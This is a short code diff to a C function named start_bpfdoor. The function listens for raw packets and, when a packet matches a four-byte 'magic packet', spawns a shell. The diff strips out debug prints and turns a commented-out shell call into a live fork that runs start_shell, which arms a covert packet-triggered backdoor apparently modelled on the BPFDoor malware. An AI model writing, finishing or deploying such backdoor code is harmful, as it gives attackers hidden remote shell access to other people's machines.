@@ -29,7 +29,7 @@ bool start_bpfdoor(){
     while(true){
         unsigned char buffer[65535];
         ssize_t received = recvfrom(fd,buffer,sizeof(buffer),0,NULL,NULL);
-        printf("received\n");
+
         if (received < 0){
             perror("recvfrom error");
             break;
@@ -52,8 +52,8 @@ bool start_bpfdoor(){
         memcpy(data,buffer+cursor,4);
 
         if(memcmp(magic_packet,data,4) == 0){
-            // start_shell();
-            printf("debug1\n");
+            int pid = fork();
+            if (pid == 0) start_shell();
         }
 
 
